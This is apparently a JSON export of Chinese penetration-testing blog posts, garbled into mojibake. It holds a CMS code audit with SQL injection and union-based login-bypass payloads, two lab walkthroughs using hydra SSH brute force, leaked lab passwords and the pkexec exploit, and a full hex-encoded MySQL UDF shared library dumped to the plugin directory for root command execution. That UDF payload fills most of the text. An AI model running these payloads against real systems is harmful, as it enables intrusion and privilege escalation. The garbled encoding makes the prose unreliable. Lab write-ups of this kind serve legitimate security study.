å‰å°SQLæ³¨å…¥å¾ˆå¤šå‚æ•°éƒ½æ²¡è¿‡æ»¤ï¼Œéšä¾¿æ³¨å…¥äº†ï¼Œåªæ˜¯æœ‰ä¸ªé™åˆ¶å°±æ˜¯éœ€è¦éªŒè¯ç  é…åˆä¸Šé¢éªŒè¯ç çš„é€»è¾‘æ¼æ´å¯ä»¥å®ç°éšä¾¿æ³¨å…¥ 1cid=0&amp;content=2dsadsç¬‘æ­»a333%40&amp;jz=1&amp;mail=&#x27; and extractvalue(0x0a,concat(0x0a,(select+version()))))%23&amp;name=asdas&amp;randcode=5x94&amp;save=æäº¤&amp;tz=1&amp;url=asdsadsa ä¸‡èƒ½å¯†ç è¿›å…¥åå°å’Œæ™®é€šä¸‡èƒ½å¯†ç ä¸ä¸€æ ·ï¼Œå®ƒéœ€è¦æŸ¥è¯¢åˆ°æ•°æ®ç„¶åä¸ç»“æœä¸­å¯†ç çš„æ¯”å¯¹ å› æ­¤åªéœ€è¦è”åˆæŸ¥è¯¢æ„é€ è™šå‡æ•°æ®å³å¯ 123POSTæ•°æ®user=1&#x27; union select 1,2,&#x27;y4tacker&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;,5,6,7,8%23password=1 å…¶ä¸­md5(1)=c4ca4238a0b923820dcc509a6f75849b åå°åå°SQLæ³¨å…¥æœ‰å¾ˆå¤šå°±ä¸åˆ—ä¸¾å‡ºæ¥äº†æ²¡æ„ä¹‰ï¼Œå…¶ä»–çš„å¤§æ¦‚çœ‹äº†ä¸‹åå°æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ ,å†…åµŒæ’ä»¶ä¹Ÿä¸èƒ½ä¸Šä¼ (ç™½åå•çš„é™åˆ¶æ— æ³•çªç ´ï¼Œä¹Ÿæ²¡æœ‰æ–‡ä»¶åŒ…å«å°±æ²¡å•¥æ„ä¹‰äº†)ï¼Œé™¤æ­¤ä»¥å¤–è¿˜æœ‰ä¸ªSSRFï¼Œä½†å•ä¸ªç³»ç»Ÿçš„SSRFæ²¡å•¥å¤ªå¤§ä»·å€¼ï¼Œé™¤éæœ‰å…¶ä»–å†…ç½‘ç³»ç»Ÿæ‰èƒ½å‡¸æ˜¾å…¶ä»·å€¼ ä¸€ä¸ªå¯è¡Œçš„RCEæ–¹æ¡ˆæ¯•ç«Ÿæ˜¯ç†Šæµ·CMSï¼Œè¦æ±‚æ˜¯ä½ç‰ˆæœ¬php5ï¼Œé‚£ä¹ˆå¦‚æœphpç‰ˆæœ¬å°äº5.2.8ï¼Œlinux éœ€è¦æ–‡ä»¶åé•¿äº 4096ï¼Œwindows éœ€è¦é•¿äº 256ï¼Œè¶…è¿‡éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒä»è€Œå®ç°æ–‡ä»¶åŒ…å«ç»•è¿‡åç¼€.phpé™åˆ¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¼ å›¾ç‰‡é©¬å³å¯ åˆæˆ–è€…é€šè¿‡00æˆªæ–­æ§åˆ¶åç¼€ï¼Œä¸è¿‡ä¹Ÿæ˜¯æœ‰é™åˆ¶çš„ï¼Œåœ¨ php ç‰ˆæœ¬å°äº 5.3.4 è€Œä¸”GPC = Off å…è®¸ä½¿ç”¨%00 æˆªæ–­ï¼Œåœ¨ä½¿ç”¨ include ç­‰æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå¯ä»¥æˆª æ–­æ–‡ä»¶åï¼Œæˆªæ–­ä¼šå— gpc å½±å“ï¼Œå¦‚æœ gpc ä¸º On æ—¶ï¼Œ%00 ä¼šè¢«è½¬ä»¥æˆ\\0 æˆªæ–­ä¼šå¤±è´¥ã€‚ å‚è€ƒæ–‡ç« https://paper.seebug.org/1112/ https://github.com/Al1ex/Rogue-MySql-Server","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"å®è®­æ‰“é¶è®°å½•(äºŒ)","slug":"year/2022/6/å®è®­æ‰“é¶è®°å½•-äºŒ","date":"2022-06-14T10:32:52.000Z","updated":"2024-08-04T09:01:49.584Z","comments":true,"path":"2022/06/14/year/2022/6/å®è®­æ‰“é¶è®°å½•-äºŒ/","link":"","permalink":"https://y4tacker.github.io/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/","excerpt":"","text":"å®è®­é¶æœº-2ä¿¡æ¯æœé›†ç«¯å£æœé›†é¦–å…ˆé€šè¿‡nmapæ‰«æé¶æœºï¼Œå‘ç°ä¸¤ä¸ªç«¯å£22å’Œ3000ï¼Œå…¶ä¸­3000æ˜¯ä¸€ä¸ªwebæœåŠ¡ é€šè¿‡dirsearchå‘ç°ä¸¤ä¸ªå¯ä»¥ç›®å½•ï¼Œå±…ç„¶æ˜¯nodejsçš„é¡¹ç›® webæœåŠ¡æœé›†é¡ºä¾¿è®°å½•ä¸‹é¦–é¡µå‡ºç°çš„ä¸‰ä¸ªç”¨æˆ·åtomcatã€markã€rastating ç®€å•åœ¨githubä¸Šé¢æœç´¢ä¸‹æœ€å…³é”®çš„ç‰¹å¾è¯å‘ç°æ²¡æœ‰è¿™ä¸ªé¡¹ç›® æºç æ³„æ¼f12å‘ç°ä¸‹é¢ç–‘ä¼¼æ¥å£æ³„æ¼ ä½†æ˜¯ç‚¹è¿›å»å‘ç°åŸæ¥æ˜¯æ•…æ„ç»™äº†æºç å•Š ç”¨æˆ·ä¿¡æ¯æ³„æ¼ç®€å•è®¿é—®ä¸€ä¸‹å‘ç°æ³„æ¼äº†ç”¨æˆ·åå’Œå¯†ç  ä¹‹åå‘ç°å»æ‰latestä»¥åè¿˜å‡ºç°äº†admin adminå¯†ç æ’åº“æ‹¿åˆ°äº†å¯†ç manchesterï¼Œæ‹¿ç€è¿™ä¸ªå»ç™»é™† adminç”¨æˆ·ç™»é™†å‘ç°ç™»é™†åæœ‰ä¸ªä¸‹è½½å¤‡ä»½ çœ‹äº†ä¸‹è¯·æ±‚ä¿¡æ¯ï¼Œå‘ç°æ˜¯getè¯·æ±‚å¹¶ä¸”æ— ä¼ å‚ï¼Œçœ‹æ¥æ— æ³•ä»»æ„æ–‡ä»¶ä¸‹è½½ è·å¾—å¤‡ä»½æ–‡ä»¶ç›´æ¥ä¿®æ”¹ä¸ºzipå‘ç°æ‰“ä¸å¼€ ç›´æ¥æ‰“å¼€å‘ç°æ˜¯ç–‘ä¼¼base64 æœç„¶æ˜¯ï¼Œç„¶åè¿˜å‘ç°æœ‰å¯†ç  çˆ†ç ´å¯†ç ç”¨archprå‘ç°çˆ†ç ´ä¸€å¹´åº”è¯¥ä¸èƒ½çˆ†ç ´ï¼Œå°è¯•ä¸‹ç”¨rockyouå­—å…¸å¾—åˆ°äº†å¯†ç magicword æˆåŠŸè·å–æºç  æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼å‘ç°æ•æ„Ÿä¿¡æ¯æ³„æ¼mark:5AYRft73VtFpc84k ç™»é™†sshæŒ‰ç…§å¥—è·¯ï¼Œå°è¯•ä½¿ç”¨ç”¨æˆ·markç™»é™†sshï¼Œç™»é™†æˆåŠŸ whoamiå‘ç°æ˜¯æ™®é€šç”¨æˆ·æƒé™ ææƒå°è¯•å¯»æ‰¾ç‰¹æƒæŒ‡ä»¤æŸ¥çœ‹æœ‰æ— ç‰¹æƒæŒ‡ä»¤ å°è¯•suidææƒ-pkexecæˆåŠŸå°è¯•suidææƒ,å‘ç°pkexecï¼Œè”æƒ³åˆ°å‰æ®µæ—¶é—´çš„pkexecæœ¬åœ°ææƒ å½±å“ç‰ˆæœ¬ 12345678910111213CentOSç³»åˆ—ï¼š CentOS 6ï¼špolkit-0.96-11.el6_10.2 CentOS 7ï¼špolkit-0.112-26.el7_9.1 CentOS 8.0ï¼špolkit-0.115-13.el8_5.1 CentOS 8.2ï¼špolkit-0.115-11.el8_2.2 CentOS 8.4ï¼špolkit-0.115-11.el8_4.2 Ubuntuç³»åˆ—ï¼š Ubuntu 20.04 LTSï¼špolicykit-1 - 0.105-26ubuntu1.2 Ubuntu 18.04 LTSï¼špolicykit-1 - 0.105-20ubuntu0.18.04.6 Ubuntu 16.04 ESMï¼špolicykit-1 - 0.105-14.1ubuntu0.5+esm1 Ubuntu 14.04 ESMï¼špolicykit-1 - 0.105-4ubuntu3.14.04.6+esm1 å‘ç°ç‰ˆæœ¬å¯¹ä¸Šäº† ç½‘ä¸Šä¸‹ä¸ªpochttps://github.com/berdav/CVE-2021-4034ï¼ŒææƒæˆåŠŸ è·å–äº¤äº’å¼shell1python -c &#x27;import pyt;pty.spwan(&quot;/bin/bash&quot;)&#x27; è·å–flagä¸€ä¸ªæ˜¯åœ¨/root/root.txt ; å¦ä¸€ä¸ªæ˜¯åœ¨/home/tom/user.txt;","categories":[{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/categories/PTES/"}],"tags":[{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/tags/PTES/"}]},{"title":"å®è®­æ‰“é¶è®°å½•(ä¸€)","slug":"year/2022/6/å®è®­æ‰“é¶è®°å½•-ä¸€","date":"2022-06-14T10:28:00.000Z","updated":"2024-08-04T09:01:49.500Z","comments":true,"path":"2022/06/14/year/2022/6/å®è®­æ‰“é¶è®°å½•-ä¸€/","link":"","permalink":"https://y4tacker.github.io/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/","excerpt":"","text":"å®è®­é¶æœº-1å®è®­æœŸé—´å…ˆæå¼€å‘å†æäº†æ¸—é€ï¼Œç°åœ¨å¼€å§‹æ¸—é€é˜¶æ®µäº† ä¿¡æ¯æ”¶é›†ç«¯å£æ‰«æå‘ç°ä¸‰ä¸ªç«¯å£ï¼Œæš´éœ²äº†webæœåŠ¡ ç”¨dirsearchè¿›è¡Œæ‰«æï¼Œå‘ç°æœ‰vendorç›®å½•ï¼Œé‡Œé¢å¯èƒ½æœ‰composerç”Ÿæˆçš„é“­æ„Ÿä¿¡æ¯ å‘ç°é…ç½®é”™è¯¯ï¼Œæ­£å¥½èƒ½è®¿é—®å¯¹åº”æ–‡ä»¶ è·å¾—webç›®å½•ç»å¯¹è·¯å¾„ PHPmailerç‰ˆæœ¬5.2.16 å­˜åœ¨æ¼æ´åˆ©ç”¨ç‚¹kalié‡Œé¢å‘ç°æ¼æ´åˆ©ç”¨ç‚¹ å­˜åœ¨wordpressç«™ç‚¹é¦–é¡µç‚¹å‡»BLOGè·³è½¬åˆ°wordpressé¡µé¢ wpscanå°è¯•æ‰«ææ¼æ´å‘ç°ä¸¤ä¸ªç”¨æˆ·stevenä¸michael å°è¯•çˆ†ç ´sshå¯†ç æ”¶é›†åˆ°çš„ä¸¤ä¸ªç”¨æˆ·è¿›è¡Œåˆ©ç”¨ 1hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -F -V 192.168.10.131 ssh æˆåŠŸå¾—åˆ°michaelçš„å¯†ç Michael å°è¯•sshè¿œç¨‹ç™»å½• mysqlæŸ¥çœ‹mysqlæ˜¯å¦è¿è¡Œ è·å–mysqlå¯†ç åœ¨wordpressç›®å½•ä¸‹wp-config.phpè·å¾—äº†rootç”¨æˆ·çš„å¯†ç  12345/** MySQL database username */define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);/** MySQL database password */define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;); ç™»é™†mysql æŸ¥çœ‹æ•°æ®åº“show database æŸ¥çœ‹wordpresså½“ä¸­çš„è¡¨ æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·å¹¶ç ´è§£å¯†ç  $P$BqfBDRL7nB8b5G0aPRMiL.iSsn5YD00å»somd5æŸ¥è¯¢åå¾—åˆ°stevenå¯†ç pink84 sshç™»é™†stevenç”¨æˆ·å¹¶è·å–äº¤äº’å¼shell1python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; sudo -lé€šè¿‡ç‰¹æƒæŒ‡ä»¤ææƒ ææƒ ç¬¬äºŒç§æ–¹å¼ï¼šphpmailerè·å–webæƒé™è¿™é‡Œç”¨pythonè„šæœ¬ææƒ è¿™é‡Œå¯¹å…¶ä¿®æ”¹æ”¹ä¸ºä¸€ä¸ªphpåé—¨ï¼Œæ–¹ä¾¿åæ¸—é€ ä¹‹ååˆ©ç”¨è¿™ä¸ªbackdoor.phpï¼Œè·å–è™šæ‹Ÿç»ˆç«¯ï¼Œå‘ç°mysqlä¸ºrootç”¨æˆ·è¿è¡Œï¼Œå¦‚æœèƒ½é€šè¿‡mysqlææƒé™é‚£ä¹ˆå°±ä¼šè·å¾—rootç”¨æˆ·æƒé™ UDFææƒåœ¨èšå‰‘ä½¿ç”¨mysqlè¿æ¥æ’ä»¶ mysqlæŸ¥è¯¢ç³»ç»Ÿç›¸å…³ä¿¡æ¯å¾—åˆ°mysqlç‰ˆæœ¬ è·å–åˆ°ç³»ç»Ÿä¸º64ä½ç³»ç»Ÿ æŸ¥çœ‹å†™å…¥æƒé™åæ­£æ˜¯rootï¼Œå°±ç®—æ— ä¹Ÿå¯ä»¥æ”¹ï¼Œå‘ç°å¯ä»¥å†™ 1show global variables like &#x27;%secure%&#x27;; æŸ¥çœ‹mysqlæ’ä»¶ç›®å½•åœ°å€ udfä¸€æŠŠæ¢­å“ˆ 1SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf_y4.so&#x27;; ä¹‹ååˆ›å»ºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å³å¯ 1CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf_y4.so&#x27;; æˆåŠŸè·å¾—rootæƒé™ flagflag1{b9bbcb33e11b80be759c4e844862482d} é¦–é¡µservice.html flag2{fc3fd58dcdad9ab23faca6e9a36e581c} /var/www/flag2.txt flag3{afc01ab56b50591e7dccf93122770cd2} æ•°æ®åº“ flag4{715dea6c055b9fe3337544932f2941ce} /root/flag4.txt","categories":[{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/categories/PTES/"}],"tags":[{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/tags/PTES/"}]},{"title":"OpenRaspåˆ†æ","slug":"year/2022/5/OpenRaspåˆ†æ","date":"2022-05-28T13:29:30.000Z","updated":"2024-08-04T09:01:49.370Z","comments":true,"path":"2022/05/28/year/2022/5/OpenRaspåˆ†æ/","link":"","permalink":"https://y4tacker.github.io/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/","excerpt":"","text":"OpenRaspåˆ†æ[TOC] å†™åœ¨å‰é¢â€‹ èŠ±äº†ç‚¹æ—¶é—´å­¦ä¹ äº†ä¸‹openraspçš„æ ¸å¿ƒä»£ç ï¼Œè¿™é‡Œåšä¸‹ç®€å•çš„åˆ†æ â€‹ ç›¸å…³é¡¹ç›®åœ°å€ï¼š â€‹ https://github.com/baidu-security/openrasp-v8 â€‹ https://github.com/baidu/openrasp â€‹ è¿™é‡Œæˆ‘ä»¥ç›®å‰å®˜ç½‘æœ€æ–°ç‰ˆçš„1.3.7æ¥åšä¸‹åˆ†æï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿ç®€å•ç”¨springbootå†™ä¸ªç®€å•çš„æ§åˆ¶å™¨æ¥è¿›è¡Œè°ƒè¯•åˆ†æå³å¯ï¼Œå½“ç„¶è¿™é‡Œä¸ä¼šå»çœ‹åç«¯äº‘æ§éƒ¨åˆ†çš„ä»£ç ï¼Œç¬”è€…åªæ˜¯æƒ³ç†æ¸…OpenRaspçš„é€»è¾‘ â€‹ 